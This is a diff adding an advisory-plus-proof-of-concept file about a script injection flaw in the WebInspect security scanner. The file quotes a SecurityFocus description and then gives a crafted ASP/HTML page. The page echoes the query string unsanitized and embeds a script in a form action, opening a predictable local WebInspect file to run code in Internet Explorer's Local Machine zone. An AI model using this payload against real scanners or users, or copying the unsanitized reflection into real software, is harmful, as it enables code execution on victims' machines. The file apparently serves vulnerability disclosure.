@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/14385/info
+
+WebInspect is vulnerable to a cross-application script injection vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied data prior to including it in content rendered in an Internet Explorer COM object.
+
+This vulnerability allows attackers to execute arbitrary script code in the context of the vulnerable application. By exploiting the knowledge of predictable files on the targeted system, attackers may also cause arbitrary script code to be executed in the "Local Machine" zone, facilitating remote machine code installation and execution. 
+
+<HTML><HEAD><BODY>
+<%
+if request.querystring<>"" then
+response.write request.querystring
+end if
+%>
+<form action="script>/<script>window.open(%27file://C:\\Program
+Files\\SPIDynamics\\WebInspect\\Working\\vulnerability.htm%27)</script>" method=get> Please login:<br>
+<input type=submit value="Login"><br> <input type=hidden name='hidden' value="Login"><br> </form>
+</BODY></HTML> 
